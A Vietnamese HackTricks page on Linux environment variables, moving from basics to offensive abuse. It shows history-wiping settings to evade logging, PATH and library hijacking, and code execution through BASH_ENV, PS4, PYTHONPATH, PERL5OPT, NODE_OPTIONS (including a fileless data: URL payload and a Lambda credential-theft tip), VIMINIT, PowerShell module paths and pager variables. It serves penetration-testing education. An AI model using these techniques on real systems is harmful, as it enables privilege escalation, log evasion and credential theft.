# Biến môi trường Linux

{{#include ../../banners/hacktricks-training.md}}

## Biến toàn cục

Các biến toàn cục **sẽ được** **các tiến trình con** kế thừa.

Bạn có thể tạo một biến toàn cục cho phiên hiện tại bằng cách:

```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```

Biến này sẽ khả dụng trong các phiên hiện tại và các tiến trình con của chúng.

Bạn có thể **xóa** một biến bằng cách thực hiện:

```bash
unset MYGLOBAL
```

## Biến cục bộ

**Biến cục bộ** chỉ có thể được **truy cập** bởi **shell/script hiện tại**.

```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```

## Liệt kê các biến hiện tại

```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```

Nội dung của `/proc/*/environ` được **phân tách bằng NUL**, vì vậy các biến thể sau thường dễ đọc hơn:

```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```

Nếu bạn đang tìm **thông tin xác thực** hoặc **cấu hình dịch vụ đáng chú ý** trong các môi trường được kế thừa, hãy xem thêm [Linux Post Exploitation](../post-exploitation/README.md).

## Các biến phổ biến

Nguồn: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – màn hình được **X** sử dụng. Biến này thường được đặt thành **:0.0**, nghĩa là màn hình đầu tiên trên máy tính hiện tại.
- **EDITOR** – trình soạn thảo văn bản mà người dùng ưu tiên.
- **HISTFILESIZE** – số dòng tối đa có trong file history.
- **HISTSIZE** – số dòng được thêm vào file history khi người dùng kết thúc phiên làm việc.
- **HOME** – thư mục home của bạn.
- **HOSTNAME** – hostname của máy tính.
- **LANG** – ngôn ngữ hiện tại của bạn.
- **MAIL** – vị trí lưu trữ thư của người dùng. Thường là **/var/spool/mail/USER**.
- **MANPATH** – danh sách các thư mục cần tìm trang hướng dẫn.
- **OSTYPE** – loại hệ điều hành.
- **PS1** – dấu nhắc mặc định trong bash.
- **PATH** – lưu đường dẫn đến tất cả thư mục chứa các tệp nhị phân mà bạn muốn thực thi chỉ bằng cách chỉ định tên tệp, thay vì dùng đường dẫn tương đối hoặc tuyệt đối.
- **PWD** – thư mục làm việc hiện tại.
- **SHELL** – đường dẫn đến shell lệnh hiện tại (ví dụ: **/bin/bash**).
- **TERM** – loại terminal hiện tại (ví dụ: **xterm**).
- **TZ** – múi giờ của bạn.
- **USER** – tên người dùng hiện tại của bạn.

## Các biến thú vị cho hacking

Không phải biến nào cũng hữu ích như nhau. Từ góc độ tấn công, hãy ưu tiên các biến làm thay đổi **đường dẫn tìm kiếm**, **tệp khởi động**, **hành vi của dynamic linker** hoặc **kiểm toán/ghi nhật ký**.

### **HISTFILESIZE**

**Đổi giá trị của biến này thành 0** để khi bạn **kết thúc phiên làm việc**, **file history** (\~/.bash_history) sẽ bị **cắt còn 0 dòng**.

```bash
export HISTFILESIZE=0
```

### **HISTSIZE**

Thay đổi **giá trị của biến này thành 0** để các lệnh **không được lưu trong lịch sử trong bộ nhớ** và không được ghi lại vào **tệp lịch sử** (\~/.bash_history).

```bash
export HISTSIZE=0
```

### **HISTCONTROL**

Nếu **giá trị của biến này được đặt thành `ignorespace` hoặc `ignoreboth`**, mọi lệnh có thêm dấu cách ở đầu sẽ không được lưu vào lịch sử.

```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```

### **HISTFILE**

Trỏ **tệp lịch sử** đến **`/dev/null`** hoặc bỏ đặt biến này hoàn toàn. Cách này thường đáng tin cậy hơn việc chỉ thay đổi kích thước lịch sử.

```bash
export HISTFILE=/dev/null
unset HISTFILE
```

### http_proxy & https_proxy

Các tiến trình sẽ sử dụng **proxy** được khai báo ở đây để kết nối internet qua **http hoặc https**.

```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```

### all_proxy & no_proxy

- `all_proxy`: proxy mặc định cho các công cụ/giao thức hỗ trợ biến này.
- `no_proxy`: danh sách bypass (host/domain/CIDR) cần kết nối trực tiếp.

```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```

Có thể sử dụng dạng viết thường hoặc viết hoa, tùy theo công cụ (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Các tiến trình sẽ tin cậy những chứng chỉ được chỉ định trong **các biến môi trường này**. Điều này hữu ích để khiến các công cụ như **`curl`**, **`git`**, các HTTP client của Python hoặc trình quản lý gói tin cậy một CA do kẻ tấn công kiểm soát (ví dụ: khiến một proxy chặn bắt trông có vẻ hợp pháp).

```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```

### **PATH**

Nếu một wrapper/script có đặc quyền thực thi lệnh **mà không dùng đường dẫn tuyệt đối**, thì **thư mục đầu tiên do kẻ tấn công kiểm soát** trong `PATH` sẽ được ưu tiên. Đây là nguyên lý đứng sau nhiều vụ **chiếm quyền PATH** trong `sudo`, cron job, shell wrapper và các helper SUID tùy chỉnh. Hãy tìm `env_keep+=PATH`, `secure_path` yếu hoặc các wrapper gọi `tar`, `service`, `cp`, `python`, v.v. theo tên.

```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```

For các chuỗi leo thang đặc quyền đầy đủ lợi dụng `PATH`, xem [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` không chỉ là tham chiếu đến thư mục: nhiều công cụ tự động tải **dotfiles**, **plugins** và **cấu hình theo người dùng** từ `$HOME` hoặc `$XDG_CONFIG_HOME`. Nếu một quy trình có đặc quyền giữ nguyên các giá trị này, **config injection** có thể dễ thực hiện hơn so với chiếm quyền điều khiển binary.

```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```

Các mục tiêu đáng chú ý gồm `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` và các tệp dành riêng cho công cụ như `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Các biến này ảnh hưởng đến **bộ liên kết động**:

- `LD_PRELOAD`: buộc tải các shared object bổ sung trước tiên.
- `LD_LIBRARY_PATH`: thêm các thư mục tìm kiếm thư viện vào đầu danh sách.
- `LD_AUDIT`: tải các thư viện auditor để theo dõi quá trình tải thư viện và phân giải symbol.

Chúng cực kỳ hữu ích cho **hooking**, **instrumentation** và **privilege escalation** nếu một lệnh có đặc quyền giữ lại chúng. Trong chế độ **thực thi an toàn** (`AT_SECURE`, ví dụ setuid/setgid/capabilities), loader loại bỏ hoặc hạn chế nhiều biến trong số này. Tuy nhiên, lỗi parser trong giai đoạn loader ban đầu vẫn có thể gây tác động nghiêm trọng vì chúng chạy **trước** chương trình đích.<sup>[[2]](#references)</sup>

```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```

### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` thay đổi hành vi ban đầu của glibc (ví dụ: các tunable của allocator) và rất hữu ích trong các lab exploit. Biến này cũng quan trọng từ góc độ bảo mật vì **dynamic loader phân tích nó từ rất sớm**. Lỗ hổng **Looney Tunables** năm 2023 là lời nhắc hữu ích rằng một biến môi trường được phân tích trong loader có thể trở thành **primitive leo thang đặc quyền cục bộ** nhắm vào các chương trình SUID.<sup>[[6]](#references)</sup>

Với CVE-2023-4911, hãy so sánh **phiên bản gói của bản phân phối đã cài đặt** với phiên bản đã được nhà cung cấp sửa lỗi, đồng thời xác minh loader thực sự được dùng cho các tiến trình mới. Chỉ dựa vào chuỗi phiên bản upstream là không đáng tin cậy: Debian đã backport parser bị ảnh hưởng vào gói 2.31, trong khi các bản phân phối khác backport bản sửa lỗi mà không thay đổi số phiên bản upstream. Để chuyển đổi đặc quyền trên thực tế, cũng cần có một tệp thực thi đích có đặc quyền mà việc thay đổi danh tính không bị `NoNewPrivs`, một phân vùng mount `nosuid` hoặc biện pháp giảm thiểu khác ngăn chặn. Tránh chạy phép thử gây crash bằng `GLIBC_TUNABLES` sai định dạng trong quá trình dò tìm thụ động. Xem [trình theo dõi của Ubuntu](https://ubuntu.com/security/CVE-2023-4911), [trình theo dõi của Debian](https://security-tracker.debian.org/tracker/CVE-2023-4911) và [thông báo bảo mật của Red Hat](https://access.redhat.com/security/cve/cve-2023-4911) để biết mức độ ảnh hưởng theo từng bản phát hành; [thông báo bảo mật](https://ubuntu.com/security/notices/USN-6409-1) của Ubuntu cũng yêu cầu khởi động lại sau khi cập nhật.

```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```

### **BASH_ENV & ENV**

Nếu **Bash** được khởi chạy ở chế độ **không tương tác**, nó kiểm tra `BASH_ENV` và nạp tệp đó trước khi chạy script đích. Khi Bash được gọi dưới tên `sh`, hoặc ở chế độ tương tác kiểu POSIX, nó cũng có thể kiểm tra `ENV`. Đây là cách kinh điển để biến một shell wrapper thành cơ chế thực thi mã nếu kẻ tấn công kiểm soát được môi trường.

```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```

Bash bỏ qua các tệp khởi động này khi **ID thực/hiệu lực khác nhau**; `-p` giữ nguyên ID hiệu lực nhưng không bật các tệp khởi động đó, vì vậy hành vi chính xác phụ thuộc vào cách wrapper gọi shell. Hãy cẩn thận với các wrapper có đặc quyền gọi `setuid()`/`setgid()` **trước khi** khởi chạy Bash: khi các ID khớp lại, Bash có thể tin cậy `BASH_ENV`, `ENV` và trạng thái shell liên quan mà bình thường sẽ bị bỏ qua.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Khi Bash chạy với **xtrace** được bật, nó mở rộng `PS4` và in giá trị này trước mỗi lệnh được theo dõi. `PS4` được mở rộng như một prompt, vì vậy một **command substitution** bên trong nó sẽ được thực thi. Điều quan trọng là có thể bật xtrace chỉ bằng cách xuất `SHELLOPTS=xtrace` từ môi trường — không cần `-x` trên dòng lệnh — nên bất kỳ script Bash nào nạn nhân chạy đều có thể dẫn đến thực thi mã.<sup>[[7]](#references)</sup>

```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```

`PS4` không có tác dụng cho đến khi xtrace được bật (`SHELLOPTS=xtrace`, `set -x` hoặc `bash -x`), và Bash loại bỏ `SHELLOPTS` trong các ngữ cảnh privileged/setuid giống như `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

Các biến này thay đổi cách Python khởi động:

- `PYTHONPATH`: thêm các đường dẫn tìm kiếm import vào đầu danh sách.
- `PYTHONHOME`: thay đổi vị trí cây thư viện chuẩn.
- `PYTHONSTARTUP`: thực thi một tệp trước dấu nhắc tương tác.
- `PYTHONINSPECT=1`: chuyển sang chế độ tương tác sau khi tập lệnh kết thúc.
- `PYTHONBREAKPOINT`: gọi `package.module.callable` (và import module của nó) khi mã chạy đến `breakpoint()`.<sup>[[8]](#references)</sup>

Chúng hữu ích khi nhắm vào các tập lệnh bảo trì, trình gỡ lỗi, shell và wrapper gọi Python với môi trường có thể kiểm soát. `python -E` và `python -I` bỏ qua mọi biến `PYTHON*`.

```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```

Một ví dụ thực tế gần đây là lỗ hổng LPE của **needrestart** năm 2024 trên các hệ thống Ubuntu/Debian: trình quét thuộc sở hữu root sao chép `PYTHONPATH` của một tiến trình không có đặc quyền từ `/proc/<PID>/environ`, rồi thực thi Python. Exploit được công bố đã đặt `importlib/__init__.so` trong đường dẫn do kẻ tấn công kiểm soát, khiến Python thực thi mã của kẻ tấn công trong quá trình khởi tạo, trước khi script được chỉ định cứng trong helper có tác dụng.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl có các biến khởi động hữu ích tương tự:

- `PERL5LIB`: thêm các thư mục thư viện vào đầu danh sách.
- `PERL5OPT`: chèn các switch như thể chúng có mặt trên mọi dòng lệnh `perl`.

Các biến này có thể buộc **tự động tải module** hoặc thay đổi hành vi của trình thông dịch trước khi script đích thực hiện bất kỳ thao tác đáng chú ý nào. Perl bỏ qua các biến này trong ngữ cảnh **taint / setuid / setgid**, nhưng chúng vẫn rất đáng lưu ý với các wrapper chạy bằng root thông thường, tác vụ CI, trình cài đặt và quy tắc sudoers tùy chỉnh.

Nếu quy tắc sudo cho phép ghi đè môi trường và lệnh có đặc quyền của nó cuối cùng khởi chạy Perl, hãy kiểm tra cả `PERL5DB`. Tài liệu Perl nêu rằng `PERL5OPT=-d` khởi chạy trình gỡ lỗi và `PERL5DB` cung cấp mã khởi tạo trình gỡ lỗi khi Perl khởi động với switch `-d` độc lập. Chỉ bỏ đặt `PERL5LIB` và `PERLLIB` không loại bỏ được đường dẫn này. Các biến phải được giữ lại qua sudo và wrapper, đồng thời tiến trình Perl không được bỏ qua chúng do xử lý taint hoặc set-ID; hãy kiểm tra chính xác quy tắc và chuỗi thực thi mà không chạy helper có đặc quyền trong quá trình liệt kê. Xem [tài liệu tham khảo về biến môi trường của perlrun](https://perldoc.perl.org/perlrun#ENVIRONMENT).

Đường dẫn tìm kiếm [`@INC` tích hợp sẵn của Perl](https://perldoc.perl.org/perlvar#@INC) cũng là một ranh giới tin cậy của module, ngay cả khi không có biến môi trường nào được giữ lại. Với một tiến trình Perl có đặc quyền, hãy đối chiếu câu lệnh `use` hoặc `require` thực tế với tên module được phân giải, thứ tự tìm kiếm và khả năng của người dùng ít đặc quyền hơn trong việc tạo hoặc thay thế module đó bên dưới một thư mục được tìm kiếm. Chỉ riêng việc một thư mục thư viện có quyền ghi không chứng minh rằng tiến trình có đặc quyền sẽ tải mã từ đó.

```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```

### **NODE_OPTIONS**

`NODE_OPTIONS` thêm **Node.js CLI flags** vào trước mọi tiến trình `node` kế thừa môi trường. Điều này khiến nó hữu ích khi nhắm vào các wrapper, CI job, helper của Electron và quy tắc sudo mà cuối cùng gọi Node. Các flag thú vị nhất khi khai thác thường là:

- `--require <file>`: nạp trước một file CommonJS trước khi chạy script đích.
- `--import <module>`: nạp trước một ES module trước khi chạy script đích.

Node từ chối một số flag nguy hiểm trong `NODE_OPTIONS`, nhưng `--require` và `--import` được cho phép rõ ràng và được xử lý **trước** các đối số dòng lệnh thông thường.<sup>[[4]](#references)</sup>

```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```

#### Preload không cần tệp bằng URL `data:`

Khi có thể đặt `NODE_OPTIONS` nhưng **không thể ghi tệp** trên mục tiêu (hệ thống tệp chỉ đọc, API bị hạn chế, môi trường serverless, v.v.), `--import` chấp nhận URL `data:text/javascript,`, vì vậy toàn bộ payload nằm ngay trong biến môi trường. JavaScript phải được **mã hóa URL hoàn toàn** — Node phân tích giá trị này dưới dạng URL, nên bất kỳ dấu cách thô nào (hoặc ký tự chưa mã hóa khác) cũng sẽ làm payload bị cắt cụt và gây ra `SyntaxError`. Cách này hoạt động trên Node 20.6 trở lên, nơi `--import` nằm trong danh sách cho phép của `NODE_OPTIONS`.<sup>[[4]](#references)</sup>

```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```

> [!TIP]
> Đây là cách phổ biến để biến quyền kiểm soát `NODE_OPTIONS` thành RCE trên **các môi trường cloud được quản lý** chạy hàm Node. Ví dụ, kẻ tấn công chỉ có thể thay đổi cấu hình của Lambda (`lambda:UpdateFunctionConfiguration`, không có `iam:PassRole` và không thể cập nhật code) có thể chèn `NODE_OPTIONS=--import data:text/javascript,<payload>` để chạy code bên trong hàm và đánh cắp thông tin xác thực của execution role. Module được chèn chạy **trước** handler, sau đó handler vẫn thực thi bình thường.

Để xem các chuỗi gadget từ xa thiết lập `NODE_OPTIONS` gián tiếp (ví dụ, dùng prototype-pollution để đạt RCE), hãy xem [trang khác này](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby có cùng kiểu lạm dụng lúc khởi động:

- `RUBYLIB`: thêm các thư mục vào đầu load path của Ruby.
- `RUBYOPT`: chèn các tùy chọn dòng lệnh như `-r` vào mọi lần gọi `ruby`.

```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```

Các lỗ hổng **needrestart** năm 2024 cho thấy đây không chỉ là một thủ thuật trong lab: cùng một helper do root sở hữu, vốn dễ bị khai thác bằng `PYTHONPATH`, cũng có thể bị ép chạy Ruby với `RUBYLIB` do attacker kiểm soát, rồi tải `enc/encdb.so` từ thư mục của attacker.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim thực thi các lệnh Ex trong `VIMINIT` (hoặc biến dự phòng `EXINIT`) khi khởi động bình thường. Lệnh Ex bao gồm `:!cmd` và `:call system(...)`, vì vậy kiểm soát biến này sẽ cho phép thực thi mã mỗi khi nạn nhân mở Vim (chẳng hạn `sudo vim` chạy với quyền root, `crontab -e`, `visudo`, hoặc `git`/`less` gọi `$EDITOR`).<sup>[[9]](#references)</sup>

```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```

Batch mode (`vim -es`/`-Es`) bỏ qua các biến này, nhưng khi khởi động bình thường ở chế độ tương tác, chúng sẽ được chạy.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

PowerShell Core (`pwsh`) chạy trên Linux/macOS (và Windows) và là một **ứng dụng .NET**, vì vậy một số biến môi trường có thể khiến mọi lần gọi `pwsh` với môi trường được kế thừa đều thực thi code — hữu ích khi nhắm vào các job cron/systemd, CI runner và wrapper có đặc quyền gọi `pwsh` thông qua shell.

- `PSModulePath`: PowerShell tìm kiếm đệ quy trong mọi thư mục thuộc danh sách này để tìm module `.psd1`/`.psm1` và **tự động tải** một module khi lần đầu có lệnh do module đó xuất được tham chiếu. Thêm một thư mục vào đầu danh sách sẽ khiến code cấp cao nhất trong module của bạn chạy khi import; vì thứ tự phân giải là *Alias → Function → Cmdlet*, một function được export thậm chí có thể ghi đè cmdlet tích hợp mà nạn nhân gọi.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: chuyển vị trí của `powershell/Microsoft.PowerShell_profile.ps1`, file được thực thi khi khởi động (trừ khi dùng `-NoProfile`).
- `DOTNET_STARTUP_HOOKS`: assembly được quản lý có `StartupHook.Initialize()` chạy trước `Main` (được mọi ứng dụng .NET dùng chung).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: API profiling của CLR tải thư viện của attacker vào process khi khởi động (các biến path được ưu tiên hơn registry; `DOTNET_*` là alias mới hơn). Trên Windows PowerShell 5.1 (.NET Framework), hãy dùng `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>

```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```

Trên Windows, `PSExecutionPolicyPreference=Bypass` còn gỡ bỏ rào chắn "chặn script chưa ký", khiến profile/module được cài vào thực sự chạy. Xem trang chuyên biệt để biết các PoC đầy đủ:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Một số công cụ không chỉ đọc một đường dẫn từ môi trường; chúng truyền giá trị cho **shell**, **editor** hoặc **bộ tiền xử lý đầu vào**. Điều này khiến các biến sau đặc biệt đáng chú ý khi một wrapper có đặc quyền chạy `git`, `man`, `less` hoặc các trình xem văn bản tương tự:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: chọn lệnh pager.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: chọn lệnh editor, thường kèm đối số.
- `LESSOPEN`, `LESSCLOSE`: xác định các bộ tiền/hậu xử lý chạy khi `less` mở một tệp.

```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```

Git cũng hỗ trợ **chèn cấu hình chỉ qua biến môi trường** mà không cần ghi vào đĩa, thông qua `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` và `GIT_CONFIG_VALUE_<n>`:

```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```

Từ góc độ post-exploitation, cũng cần nhớ rằng môi trường được kế thừa thường chứa **credentials**, **proxy settings**, **service tokens** hoặc **cloud keys**. Xem [Linux Post Exploitation](../post-exploitation/README.md) để tìm kiếm `/proc/<PID>/environ` và `Environment=` của `systemd`.

### PS1

Thay đổi giao diện của prompt.

[**Đây là một ví dụ**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Đây là một ví dụ](<../images/image (897).png>)

Người dùng thông thường:

![PERL5OPT & PERL5LIB - PS1: Một, hai và ba công việc chạy nền](<../images/image (740).png>)

Một, hai và ba công việc chạy nền:

![PERL5OPT & PERL5LIB - PS1: Một, hai và ba công việc chạy nền](<../images/image (145).png>)

Một công việc chạy nền, một công việc bị tạm dừng và lệnh cuối cùng không hoàn tất chính xác:

![PERL5OPT & PERL5LIB - PS1: Một công việc chạy nền, một công việc bị tạm dừng và lệnh cuối cùng không hoàn tất chính xác](<../images/image (715).png>)

## References

- [1] [Sổ tay GNU Bash - Tệp khởi động Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPE trong needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Tài liệu CLI Node.js - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Các biến môi trường phổ biến - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - Leo thang đặc quyền cục bộ trong ld.so của glibc - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [Sổ tay GNU Bash - Các biến Bash (`PS4`) và lệnh dựng sẵn Set (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - breakpoint() tích hợp sẵn và PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Tài liệu Vim - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath và tự động tải module PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [Cài đặt cấu hình gỡ lỗi và lập hồ sơ .NET (các biến profiler `CORECLR_`/`DOTNET_`/`COR_`)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
